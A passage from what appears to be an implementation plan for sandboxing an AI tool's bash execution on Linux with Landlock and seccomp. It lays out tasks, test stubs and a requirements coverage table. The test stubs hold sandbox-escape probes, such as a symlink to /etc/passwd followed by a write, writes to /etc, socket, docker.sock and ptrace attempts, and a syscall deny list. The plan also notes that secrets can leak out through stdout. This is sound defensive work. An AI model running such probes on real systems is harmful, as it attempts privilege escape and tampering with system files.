	// run: `id -u` before/after attempting a setuid helper; euid must not drop to 0.
	// Assert the process cannot escalate; if no setuid helper is available on the
	// host, assert PR_GET_NO_NEW_PRIVS==1 via a /proc/self/status "NoNewPrivs: 1" read.
}
```

- [ ] **Step 5: Write the fail-closed test** (status/error pipe — a child setup error surfaces as `ErrUnsupported`, command not run)

```go
func TestRun_ChildSetupFails_FailsClosedCommandNotRun(t *testing.T) {
	// inject an apply-step failure via a test seam (e.g. an unwritable sentinel
	// the no-op stub can be told to fail through a build-tagged test hook), assert
	// Run returns ErrUnsupported and the command's side effect never happened.
}
```

- [ ] **Step 6: Implement** — `sandbox_linux.go` `Run`, `child_linux.go` `RunChild`, the no-op LSM stubs, and the `main.go` hook. Use `unix.Pipe2(fds, unix.O_CLOEXEC)`; pass the frame pipe read-end as `cmd.ExtraFiles[0]` (becomes fd 3 in the child) and the error pipe write-end as `ExtraFiles[1]`. The child `runtime.LockOSThread()` first (never unlocks). The parent context timeout + `limitedBuffer`s are wired by the *caller* (T8) — here `Run` accepts `stdout`/`stderr` writers and honors `ctx` cancellation by killing the child.

- [ ] **Step 7: Run — expect GREEN** (`go test ./internal/adapter/tool/bash/sandbox/...` on Linux); `GOOS=windows go build ./...`; `make check-cgo`; `make arch-test`. Commit.

```bash
git add internal/adapter/tool/bash/sandbox cmd/pythia/main.go
git commit -m "feat(bash/sandbox): self re-exec spine, __bash-sandbox hook, pipe delivery, fd hygiene, NO_NEW_PRIVS"
```

**Acceptance criteria:**
- A command runs end-to-end through `Run` via a `/proc/self/exe` re-exec and returns its output/exit code.
- Command bytes with newlines/metachars are delivered intact and are **never** interpolated into argv.
- Only fds 0/1/2 reach the child; a parent-held extra fd does not leak in.
- `NO_NEW_PRIVS` is set before the LSM steps; setuid gains nothing.
- A child setup failure fails closed (`ErrUnsupported`, command not run); the `main` hook dispatches `__bash-sandbox` before config/TUI and never returns to the TUI path.

**Test list (integration, `//go:build linux`):**
- `TestRun_SimpleCommand_ReExecsAndReturnsOutput` — SR-3a.13 (re-exec from `/proc/self/exe`).
- `TestRun_CommandWithMetachars_DeliveredIntactNeverArgv` — SR-3a.13.
- `TestRun_FdHygiene_OnlyStdioReachesChild` — SR-3a.7.
- `TestRun_NoNewPrivs_SetuidBinaryGainsNothing` — SR-3a.6.
- `TestRun_ChildSetupFails_FailsClosedCommandNotRun` — SR-3a.10 (setup-failure arm).

**Closes:** SR-3a.6 (`NO_NEW_PRIVS`), SR-3a.7 (fd hygiene), SR-3a.13 (re-exec integrity + out-of-band delivery — completing the framing from T3).

---

## Task 6: Landlock layer — strict ABI ≥ 2, fail-closed, write-scope workspace + `/tmp`

**Wave:** 3 · **blockedBy:** T5 · **PR:** medium. **Parallel-safe with T7 (disjoint file).** **🔒 SECURITY-ARCHITECT REVIEW REQUIRED (LSM policy).**

Fill `applyLandlock(p Policy)` in its own file. Read is broad (not restricted); **write is allowed only** under `p.WorkspaceRoot` and `p.TmpDir`. Require **Landlock ABI ≥ 2** (`LANDLOCK_ACCESS_FS_REFER`) so the hardlink/rename escape is closed, and **fail closed** below that floor — no best-effort degrade (threat model §2.2, §3.2, SR-3a.8). Only touches `landlock_linux.go` (T5 left it a no-op stub), so it does not contend with T7.

**Files:**
- Modify: `internal/adapter/tool/bash/sandbox/landlock_linux.go` (real `applyLandlock`)
- Create: `internal/adapter/tool/bash/sandbox/landlock_linux_test.go` (`//go:build linux`)

**Interfaces:**
- `func applyLandlock(p Policy) error` — builds a `go-landlock` config pinned to a minimum ABI (V2+), grants the write/refer rights on `WorkspaceRoot` + `TmpDir` (and read on `/`), and `RestrictSelf()`. Returns an error (→ fail-closed via T5's error pipe) if the kernel cannot fully enforce it.

- [ ] **Step 1: Write the failing write-scope tests** (driven through `Run`, since the ruleset only exists in the re-exec'd child)

```go
func TestLandlock_WriteInsideWorkspace_Succeeds(t *testing.T) {
	ws := t.TempDir()
	code, err := runCmd(t, Policy{WorkspaceRoot: ws, TmpDir: "/tmp"}, "echo ok > "+ws+"/probe")
	if err != nil || code != 0 { t.Fatalf("write inside workspace should succeed: code=%d err=%v", code, err) }
}
func TestLandlock_WriteInsideTmp_Succeeds(t *testing.T) { /* echo > /tmp/pythia-probe-... ⇒ code 0 */ }
func TestLandlock_WriteOutsideScope_DeniedEACCES(t *testing.T) {
	code, _ := runCmd(t, Policy{WorkspaceRoot: t.TempDir(), TmpDir: "/tmp"}, "echo x > /etc/pythia-probe")
	if code == 0 { t.Fatal("write to /etc must be denied (EACCES), non-zero exit") }
}
func TestLandlock_ReadOutsideScope_Succeeds(t *testing.T) {
	code, _ := runCmd(t, Policy{WorkspaceRoot: t.TempDir(), TmpDir: "/tmp"}, "cat /etc/hostname")
	if code != 0 { t.Fatal("read is broad — /etc/hostname should be readable") }
}
```

- [ ] **Step 2: Write the escape-probe tests** (SR-3a.8 hardening — REFER + symlink)

```go
func TestLandlock_HardlinkOutOfScopeThenWrite_Denied(t *testing.T) {
	// ln /etc/hostname $ws/x ; echo y > $ws/x  ⇒ denied by REFER (ABI 2)
}
func TestLandlock_SymlinkEscape_Denied(t *testing.T) {
	// ln -s /etc/passwd $ws/link ; echo z > $ws/link ⇒ resolves to /etc ⇒ denied
}
```

- [ ] **Step 3: Write the ABI-floor / fail-closed assertion** — a test (or documented harness note) that if the kernel reports ABI < 2, `applyLandlock` errors and `Run` fails closed rather than installing a weaker ruleset. On a host with ABI ≥ 2 this asserts the config's declared minimum is ≥ 2 (inspect the config, or attempt install and confirm no silent downgrade).

- [ ] **Step 4: Implement `applyLandlock`** — `landlock.V2.BestEffort()` is **rejected**; pin the exact ABI and rights and refuse on shortfall. **Step 5: Run — expect GREEN** on this host (kernel ≥ 5.13); `make check-cgo`; `make arch-test`. Commit.

```bash
git add internal/adapter/tool/bash/sandbox/landlock_linux.go internal/adapter/tool/bash/sandbox/landlock_linux_test.go
git commit -m "feat(bash/sandbox): Landlock write-scope (workspace+/tmp), strict ABI>=2, fail-closed"
```

**Acceptance criteria:**
- Write inside workspace and `/tmp` succeeds; write to `/etc` (or any out-of-scope path) is denied (non-zero exit / `EACCES`).
- Read outside scope succeeds (broad read, by design).
- Hardlink-out-of-scope-then-write and symlink escape are both denied (REFER, ABI ≥ 2).
- Below ABI 2 (or Landlock absent) `applyLandlock` errors → `Run` fails closed; no best-effort downgrade.

**Test list (integration, `//go:build linux`):**
- `TestLandlock_WriteInsideWorkspace_Succeeds`, `TestLandlock_WriteInsideTmp_Succeeds`, `TestLandlock_ReadOutsideScope_Succeeds` (happy).
- `TestLandlock_WriteOutsideScope_DeniedEACCES` (deny).
- `TestLandlock_HardlinkOutOfScopeThenWrite_Denied`, `TestLandlock_SymlinkEscape_Denied` (adversarial).
- `TestLandlock_BelowMinABI_FailsClosed` (fail-closed floor).

**Closes:** SR-3a.8 (Landlock write scope + strict ABI + hardlink/symlink containment).

---

## Task 7: seccomp layer — allowlist/default-deny, arch-validated, socket + io_uring + memory-poke + lethal-set

**Wave:** 3 · **blockedBy:** T5 · **PR:** medium-large. **Parallel-safe with T6 (disjoint file).** **🔒 SECURITY-ARCHITECT REVIEW REQUIRED (LSM policy — the single largest attack surface).**

Fill `applySeccomp()` in its own file: one seccomp-bpf filter, **allowlist / default-deny**, installed **TSYNC** on the locked thread as the **last** step before `execve` (with `execve`/`execveat` and the syscalls `syscall.Exec` issues in the allowlist, or the exec into bash fails). Per-syscall actions per decision 8. Landed as **one atomic PR** so the filter is never half-installed (a filter with arch validation but without socket denial would leave network open). Only touches `seccomp_linux.go`, so it does not contend with T6.

**Files:**
- Modify: `internal/adapter/tool/bash/sandbox/seccomp_linux.go` (real `applySeccomp`)
- Create: `internal/adapter/tool/bash/sandbox/seccomp_linux_test.go` (`//go:build linux`)

**Interfaces:**
- `func applySeccomp() error` — configures `go-seccomp-bpf` with: native-arch enforcement (any foreign arch / x32 bit → `KILL_PROCESS`); a curated allowlist (starting from the library's profile, trimmed to drop `socket`/`socketpair`, `io_uring_*`, `ptrace`, `mount`, module/key families, `unshare`/`setns`, etc.); default `ERRNO(ENOSYS)`; socket family → `ERRNO(EACCES/EAFNOSUPPORT)`; the lethal set → `KILL_PROCESS`; TSYNC on; loaded last.

- [ ] **Step 1: Write the "allowlist lets bash run" baseline** (regression guard — the curated set must still let a normal command work)

```go
func TestSeccomp_NormalCommand_StillRuns(t *testing.T) {
	code, err := runCmd(t, testPolicy(t), "echo alive && cat /etc/hostname && ls /")
	if err != nil || code != 0 { t.Fatalf("allowlist too tight — broke a benign command: code=%d err=%v", code, err) }
}
```

- [ ] **Step 2: Write the network-denial probes** (SR-3a.3, .2)

```go
func TestSeccomp_SocketAllFamilies_Denied(t *testing.T) {
	// a probe (python3 -c / a tiny helper via bash) attempting socket(AF_INET),
	// AF_INET6, AF_UNIX, AF_NETLINK — each must fail (EACCES/EAFNOSUPPORT), and
	// connect to /var/run/docker.sock and an abstract socket must fail.
}
func TestSeccomp_IoUring_DeniedOrKilled(t *testing.T) {
	// io_uring_setup probe ⇒ denied (killed); a network op via io_uring cannot connect.
}
func TestSeccomp_CurlStyleNetwork_FailsCleanly(t *testing.T) {
	code, out := runCmdOut(t, testPolicy(t), "getent hosts example.com || echo NET-DENIED")
	if !strings.Contains(out, "NET-DENIED") { t.Fatalf("network path not denied: %q", out) }
}
```

- [ ] **Step 3: Write the arch / memory-poke / lethal-set probes** (SR-3a.4, .5, .14)

```go
func TestSeccomp_ForeignArchX32_Killed(t *testing.T) {
	// issue a syscall with __X32_SYSCALL_BIT (or an i386 int-0x80 stub) ⇒ process KILLED
}
func TestSeccomp_MemoryPoke_Denied(t *testing.T) {
	// ptrace, process_vm_readv, process_vm_writev, kcmp, userfaultfd probes ⇒ denied/killed
}
func TestSeccomp_LethalSet_Killed(t *testing.T) {
	// mount, umount2, pivot_root, kexec_load, init_module/finit_module/delete_module,
	// bpf, add_key/keyctl/request_key, unshare/setns, reboot, swapon/swapoff ⇒ process killed
}
func TestSeccomp_UnknownSyscall_DefaultDeny(t *testing.T) {
	// a benign uncommon syscall not in the allowlist returns ENOSYS (not allowed)
}
```

- [ ] **Step 4: Write the persistence test** (SR-3a.9 — filter survives `execve`, all threads)

```go
func TestSeccomp_FilterPersistsIntoBash_PostExecStillDenied(t *testing.T) {
	// the denied probe runs from *within bash* (post-exec), proving the filter
	// carried across execve on the locked thread with TSYNC covering all threads.
}
```

- [ ] **Step 5: Implement `applySeccomp`** per decision 8; iterate the allowlist until `TestSeccomp_NormalCommand_StillRuns` and the exec-into-bash path are green while every deny probe stays denied. **Step 6: Run — expect GREEN**; `make check-cgo`; `make arch-test`. Commit.

```bash
git add internal/adapter/tool/bash/sandbox/seccomp_linux.go internal/adapter/tool/bash/sandbox/seccomp_linux_test.go
git commit -m "feat(bash/sandbox): seccomp allowlist — arch-validated, socket/io_uring/memory-poke/lethal-set denied, TSYNC"
```

**Acceptance criteria:**
- A benign command still runs (allowlist not over-tight); `execve` into bash succeeds.
- `socket()` denied for AF_INET/INET6/UNIX/NETLINK; io_uring blocked; docker.sock + abstract-socket connects fail.
- Foreign-arch/x32 killed; ptrace/process_vm_*/kcmp/userfaultfd denied; the full lethal set killed; unknown syscalls default to ENOSYS.
- The filter persists across `execve` (post-exec probe still denied) with TSYNC covering all threads.

**Test list (integration, `//go:build linux`):**
- `TestSeccomp_NormalCommand_StillRuns` (regression) — SR-3a.1.
- `TestSeccomp_SocketAllFamilies_Denied`, `TestSeccomp_IoUring_DeniedOrKilled`, `TestSeccomp_CurlStyleNetwork_FailsCleanly` — SR-3a.3, .2.
- `TestSeccomp_ForeignArchX32_Killed` — SR-3a.4.
- `TestSeccomp_MemoryPoke_Denied` — SR-3a.5.
- `TestSeccomp_LethalSet_Killed` — SR-3a.14.
- `TestSeccomp_UnknownSyscall_DefaultDeny` — SR-3a.1.
- `TestSeccomp_FilterPersistsIntoBash_PostExecStillDenied` — SR-3a.9.

**Closes:** SR-3a.1, SR-3a.2, SR-3a.3, SR-3a.4, SR-3a.5, SR-3a.9, SR-3a.14.

---

## Task 8: Wire the sandbox into `bashTool.Invoke` + fail-closed + one-time unsandboxed log

**Wave:** 4 · **blockedBy:** T1, T6, T7 · **PR:** medium.

Now that a *complete* sandbox exists (T6 + T7 filled the no-op stubs), route `bashTool.Invoke` through it behind the existing `core.Tool` seam. The tool gains a `sandbox` bool (parent decision from `cfg.BashSandbox`, passed as a plain value — the adapter does **not** import `config`). When **on**: build a `Policy{WorkspaceRoot: workDir, TmpDir: "/tmp"}`, call `sandbox.Run` with the bounded `limitedBuffer`s and the context timeout, and map the result into the frozen `output` envelope; `ErrUnsupported` (or any sandbox setup error) ⇒ **error envelope, command not run** (fail-closed, SR-3a.10). When **off**: the legacy direct-exec path runs, and a **one-time** explicit "bash sandbox DISABLED" log is emitted (repudiation control; SR-3a.11). The child never consults any flag — the off-branch lives only here in the parent.

**Files:**
- Modify: `internal/adapter/tool/bash/bash.go` (constructor `New(workDir, timeout, maxOutputBytes, sandbox bool)`, `Invoke` branch)
- Modify: `internal/adapter/tool/bash/bash_test.go`
- Modify: `cmd/pythia/main.go` (`bash.New(cfg.WorkspaceRoot, cfg.BashTimeout, cfg.MaxBashOutputBytes, cfg.BashSandbox == config.SandboxOn)`)

**Interfaces:**
- `func New(workDir string, timeout time.Duration, maxOutputBytes int64, sandbox bool) core.Tool`.
- The `output` envelope (stdout/stderr/exit_code/truncated/timed_out) is unchanged; the sandboxed and legacy paths both produce it.

- [ ] **Step 1: Update the existing bash unit tests** to pass the new `sandbox` arg. The pre-existing tests (`TestBash_SimpleCommand_...` etc.) run with `sandbox=false` (legacy path) so they remain pure unit tests with no kernel dependency — they must stay green.

- [ ] **Step 2: Write the fail-closed test** (SR-3a.10 — through `Invoke`)

```go
func TestBash_SandboxOnButUnavailable_ReturnsErrorEnvelopeCommandNotRun(t *testing.T) {
	// force the sandbox-unavailable path (a test seam / stubbed Run returning
	// ErrUnsupported). Invoke must return a {"error":...} envelope (nil Go error)
	// and the command's side effect (e.g. writing a sentinel file) must NOT happen.
}
```

- [ ] **Step 3: Write the one-time-log test** (SR-3a.11 — off-branch is loud and parent-only)

```go
func TestBash_SandboxOff_EmitsOneTimeUnsandboxedLog(t *testing.T) {
	// construct with sandbox=false; capture the log sink; assert exactly one
	// "sandbox DISABLED" line is emitted across multiple Invoke calls.
}
```

- [ ] **Step 4: Write the sandboxed-happy integration test** (`//go:build linux`) — `New(ws, 5s, 1<<20, true)`; `Invoke("echo wired")` returns the `ok` envelope with `stdout=="wired"` and `exit_code==0`, proving the full stack (T1–T7) is reachable through the public seam.

- [ ] **Step 5: Implement** the `Invoke` branch + constructor + `main.go` wiring. Preserve the timeout/truncation semantics by wiring `ctx` + the `limitedBuffer`s into `sandbox.Run`. **Step 6: Run — expect GREEN** (unit on any OS; integration on Linux); `make check-cgo`; `make arch-test`. Commit.

```bash
git add internal/adapter/tool/bash/bash.go internal/adapter/tool/bash/bash_test.go cmd/pythia/main.go
git commit -m "feat(bash): route Invoke through the OS sandbox, fail-closed, one-time unsandboxed log"
```

**Acceptance criteria:**
- `sandbox=on` + unavailable ⇒ `{"error":...}` envelope, command not executed (fail-closed).
- `sandbox=off` ⇒ legacy path + exactly one "sandbox DISABLED" log; the child never has an off-branch.
- A sandboxed command runs end-to-end through `Invoke` and yields the unchanged `output` envelope.
- All pre-existing bash unit tests stay green; `make arch-test` green.

**Test list:**
- `TestBash_SandboxOnButUnavailable_ReturnsErrorEnvelopeCommandNotRun` (unit — SR-3a.10).
- `TestBash_SandboxOff_EmitsOneTimeUnsandboxedLog` (unit — SR-3a.11).
- `TestBash_SandboxedEchoThroughInvoke_ReturnsOkEnvelope` (integration, `linux`).
- (all pre-existing `TestBash_*` unit tests — regression).

**Closes:** SR-3a.10 (fail-closed on unavailable), SR-3a.11 (hatch child-has-no-off-branch, parent-only decision — completing T1).

---

## Task 9: Bypass-probe integration/e2e suite (through `Invoke` + registry)

**Wave:** 5 · **blockedBy:** T8 · **PR:** medium. **Parallel-safe with T10.**

The threat-model-seeded proof suite, exercised through the **public `Invoke` seam** and end-to-end through the tool **registry** — the spec's "Testing" and "Additional bypass-probe tests" sections. T6/T7 proved each control at the layer; this task proves them at the boundary the model actually reaches, plus the cross-cutting probes that need the whole stack assembled (binary/DB overwrite, PATH-plant, inherited-fd, escape-hatch round-trip). Every case names the SR it proves.

**Files:**
- Create: `internal/adapter/tool/bash/sandbox/bypass_linux_test.go` (`//go:build linux` — raw syscall / fd probes)
- Create: `internal/adapter/tool/bash/sandbox_integration_linux_test.go` (`//go:build linux` — through `bashTool.Invoke` + a real `registry`)

**Interfaces:**
- Consumes: `bash.New(..., true)`, `registry.New`, `sandbox.Run`. No production code changes — this is a test-only PR.

- [ ] **Step 1: Write the through-`Invoke` control matrix** (each maps to the spec Testing bullets)

```go
func TestSandbox_WriteOutsideWorkspace_DeniedViaInvoke(t *testing.T)      // SR-3a.8
func TestSandbox_WriteInsideWorkspaceAndTmp_SucceedsViaInvoke(t *testing.T) // SR-3a.8
func TestSandbox_ReadBroad_SucceedsViaInvoke(t *testing.T)                // design (broad read)
func TestSandbox_NetworkCurl_DeniedViaInvoke(t *testing.T)                // SR-3a.3
func TestSandbox_PtraceAndMount_DeniedViaInvoke(t *testing.T)            // SR-3a.5, .14
func TestSandbox_ParentSecretNotVisible_ViaInvoke(t *testing.T)          // SR-3a.12
func TestSandbox_EscapeHatchOff_ProbesNowSucceed(t *testing.T)           // SR-3a.11
```

- [ ] **Step 2: Write the adversarial bypass probes** (each proves a must-fix control)

```go
func TestSandbox_AFUnixAndNetlink_DeniedViaInvoke(t *testing.T)          // SR-3a.3
func TestSandbox_IoUringNetworkOrOpen_DeniedViaInvoke(t *testing.T)      // SR-3a.2
func TestSandbox_X32Syscall_KilledViaInvoke(t *testing.T)               // SR-3a.4
func TestSandbox_InheritedFdProbe_NotPresentInChild(t *testing.T)        // SR-3a.7
func TestSandbox_HardlinkOutOfScopeThenWrite_DeniedViaInvoke(t *testing.T) // SR-3a.8
func TestSandbox_FakeBashCurlOnWritablePath_NotUsed(t *testing.T)        // SR-3a.12
func TestSandbox_BinaryOverwriteAttempt_DeniedReExecIntegrityHeld(t *testing.T) // SR-3a.13
func TestSandbox_SessionDBTamperAttempt_Denied(t *testing.T)             // SR-3a.13
```

- [ ] **Step 3: Write the e2e-through-registry case** — build the real `registry` with the sandboxed `bash` tool, resolve `Get("bash")`, and drive a command that writes inside `/tmp` and reads `/etc/hostname` in one shot, asserting the `ok` envelope — the sandbox exercised exactly as the turn loop reaches it.

- [ ] **Step 4: Run — expect GREEN** on this Linux host (kernel ≥ 5.13, ABI ≥ 2); `make test` (full suite incl. arch guard). Commit.

```bash
git add internal/adapter/tool/bash/sandbox/bypass_linux_test.go internal/adapter/tool/bash/sandbox_integration_linux_test.go
git commit -m "test(bash/sandbox): threat-model bypass-probe suite through Invoke + registry"
```

**Acceptance criteria:**
- Every spec Testing bullet and every "Additional bypass-probe" item has a named, green Linux-gated test through the public seam.
- The escape-hatch off path flips the same probes to success (proving the sandbox — not something else — was what denied them).
- Binary-overwrite and DB-tamper attempts are denied / re-exec integrity holds.

**Test list:** the fourteen-plus cases above (integration/e2e, `//go:build linux`), each annotated with its SR-3a.N.

**Closes:** (end-to-end confirmation of SR-3a.2, .3, .4, .5, .7, .8, .11, .12, .13, .14 through the tool boundary — no new production behavior).

---

## Task 10: Docs — README, `PYTHIA_BASH_SANDBOX`, residual-risk note, deferred H1–H3

**Wave:** 5 · **blockedBy:** T8 · **PR:** small. **Parallel-safe with T9.**

Make the sandbox operable and its residual risk explicit. Document the `PYTHIA_BASH_SANDBOX` hatch and the kernel requirement (Linux 5.13+ / Landlock ABI ≥ 2; older/non-Linux fails closed), and write the **load-bearing residual-risk note**: the sandbox cannot close the **stdout egress channel** (a command can `cat` a secret and return it through tool output), acceptable **only because the provider (Ollama) is local** — that assumption is load-bearing and reopens if a remote provider is ever added (SR-3a.H2). Record H1 (rlimits) and H3 (seccomp LOG observability) as explicitly deferred (YAGNI, per spec §Out of scope).

**Files:**
- Modify: `README.md` (env-var table row for `PYTHIA_BASH_SANDBOX`; kernel-requirement + fail-closed note)
- Create: `docs/security/bash-sandbox-residual-risk.md` (stdout-egress + local-Ollama assumption; deferred H1/H3)
- Modify: `internal/adapter/tool/bash/bash.go` + `sandbox/doc.go` package docs (point to the residual-risk note and the threat model)

**Interfaces:** docs only — no code behavior changes.

- [ ] **Step 1: Write the residual-risk note** — restate threat model §2.7 / §5.R in operator-facing terms; make the "provider is local ⇒ stdout egress is on-box" invariant unmissable, with the explicit trigger ("a remote/hosted provider, telemetry, or log-shipping reopens this and forces a read-denylist or output-scrubbing revisit").

- [ ] **Step 2: Update the README** — `PYTHIA_BASH_SANDBOX` (default `on`; `off` = debug-only, unsandboxed, emits a one-time log), the kernel floor, and the fail-closed behavior (unsupported ⇒ command refused).

- [ ] **Step 3: Cross-link** the package docs to the threat model, ADR-0005, and the new residual-risk note. **Step 4:** `make test` still green (docs don't break the build). Commit.

```bash
git add README.md docs/security/bash-sandbox-residual-risk.md internal/adapter/tool/bash/bash.go internal/adapter/tool/bash/sandbox/doc.go
git commit -m "docs(bash/sandbox): PYTHIA_BASH_SANDBOX, kernel floor, residual-risk (stdout egress), deferred H1/H3"
```

**Acceptance criteria:**
- README documents `PYTHIA_BASH_SANDBOX`, the kernel floor, and fail-closed behavior.
- The residual-risk note states the stdout-egress channel and the load-bearing local-Ollama assumption, with the reopen trigger.
- H1 (rlimits) and H3 (observability) are recorded as explicitly deferred.

**Test list:** none (docs-only PR); `make test` must stay green.

**Closes:** SR-3a.H2 (documented-invariant form, as the spec elects); records H1/H3 as deferred.

---

## Self-Review (SR coverage / build-order / dependency-rule)

**Must-fix SR coverage — every SR-3a.1–.14 is closed by a task and proven by a named test:**

| SR | Requirement | Closed by | Proven by (representative) |
|----|-------------|-----------|----------------------------|
| SR-3a.1 | Default-deny seccomp allowlist | T7 | `TestSeccomp_NormalCommand_StillRuns`, `TestSeccomp_UnknownSyscall_DefaultDeny` |
| SR-3a.2 | io_uring blocked | T7 (+T9) | `TestSeccomp_IoUring_DeniedOrKilled`, `TestSandbox_IoUringNetworkOrOpen_DeniedViaInvoke` |
| SR-3a.3 | socket() denied all families | T7 (+T9) | `TestSeccomp_SocketAllFamilies_Denied`, `TestSandbox_AFUnixAndNetlink_DeniedViaInvoke` |
| SR-3a.4 | Foreign-arch / x32 killed | T7 (+T9) | `TestSeccomp_ForeignArchX32_Killed`, `TestSandbox_X32Syscall_KilledViaInvoke` |
| SR-3a.5 | Memory-poke syscalls denied | T7 (+T9) | `TestSeccomp_MemoryPoke_Denied`, `TestSandbox_PtraceAndMount_DeniedViaInvoke` |
| SR-3a.6 | NO_NEW_PRIVS; setuid gains nothing | T5 | `TestRun_NoNewPrivs_SetuidBinaryGainsNothing` |
| SR-3a.7 | fd hygiene (only 0/1/2) | T5 (+T9) | `TestRun_FdHygiene_OnlyStdioReachesChild`, `TestSandbox_InheritedFdProbe_NotPresentInChild` |
| SR-3a.8 | Landlock write-scope + strict ABI | T6 (+T9) | `TestLandlock_WriteOutsideScope_DeniedEACCES`, `TestLandlock_HardlinkOutOfScopeThenWrite_Denied`, `TestLandlock_BelowMinABI_FailsClosed` |
| SR-3a.9 | Filter persists across execve, TSYNC | T7 | `TestSeccomp_FilterPersistsIntoBash_PostExecStillDenied` |
| SR-3a.10 | Fail-closed on unavailable | T2 (non-Linux) + T5 (setup-fail) + T8 (Invoke) | `TestRun_NonLinux_FailsClosedWithErrUnsupported`, `TestRun_ChildSetupFails_FailsClosedCommandNotRun`, `TestBash_SandboxOnButUnavailable_ReturnsErrorEnvelopeCommandNotRun` |
| SR-3a.11 | Hatch parent-env-only; child no off-branch | T1 (config) + T8 (parent decision) | `TestLoad_BashSandboxOff_ParsesOff`, `TestBash_SandboxOff_EmitsOneTimeUnsandboxedLog`, `TestSandbox_EscapeHatchOff_ProbesNowSucceed` |
| SR-3a.12 | Env allowlist + PATH reset | T4 (+T9) | `TestScrubEnv_DropsInjectorsKeepsAllowlist`, `TestSandbox_FakeBashCurlOnWritablePath_NotUsed` |
| SR-3a.13 | Re-exec integrity + framing + DB/binary out of scope | T3 (frame) + T5 (re-exec) + T1 (DB) | `TestFrame_RoundTrip_PreservesArbitraryBytes`, `TestRun_CommandWithMetachars_DeliveredIntactNeverArgv`, `TestLoad_DefaultDBPath_IsOutsideWorkspace`, `TestSandbox_BinaryOverwriteAttempt_...`, `TestSandbox_SessionDBTamperAttempt_Denied` |
| SR-3a.14 | Lethal-set killed | T7 (+T9) | `TestSeccomp_LethalSet_Killed` |

**Hardening SRs (deferred, documented — not built):** SR-3a.H1 (rlimits) → deferred, noted in T10. SR-3a.H2 (stdout-egress) → documented invariant in T10 (spec's elected form). SR-3a.H3 (seccomp LOG observability) → deferred, noted in T10. All match spec §Out of scope.

**Build-order / critical path:** the critical path is **T2 → {T3,T4} → T5 → {T6,T7} → T8 → {T9,T10}**. T1 is off-path (parallel with all of Wave 0–3, only rejoins at T8). The spine (T5) is the single serialization point; once it lands, the two LSM layers (T6/T7) parallelize because `child_linux.go` was written once (in T5) to call `applyLandlock`/`applySeccomp` as file-disjoint stubs. **No production code runs a no-op sandbox in a shipped state**: `bashTool.Invoke` is not wired to the spine until T8, which is blocked by both T6 and T7 — so the first moment the tool routes through the sandbox, the sandbox is complete.

**File-contention resolution:** `go.mod` (T2 only); `cmd/pythia/main.go` (T5 then T8, different waves); `bash.go` (T8 only); `child_linux.go` (T5 only — the seam that makes T6/T7 parallel-safe); `landlock_linux.go`/`seccomp_linux.go` (one owner each). No two concurrently-dispatchable tasks share a file.

**Security-review gating:** T5, T6, T7 each carry a **🔒 security-architect review** marker — they are the entire perimeter (threat model §1.1). The security-architect reviews the built control against the SR probes; it did not author this plan (independence preserved). T1/T2/T3/T4/T8/T9/T10 are ordinary staff-engineer reviews.

**Dependency-rule guard:** no task adds an import to `internal/core`. All sandbox code and its three deps live under `internal/adapter/tool/bash/sandbox`; the only non-bash change is the one-line `main.go` hook. `make arch-test` (`-count=1`, uncached) is run in every task's green step and must stay green — a regression fails the PR.

**Boundary integrity:** the `core.Tool` seam, the `ChatRequest`/`StreamEvent` ports, the `AgentEvent` contract, and the `output` envelope are all unchanged — the turn loop and TUI are untouched (ADR-0005 §Consequences). This slice is entirely inside the bash adapter plus a thin composition-root dispatch.
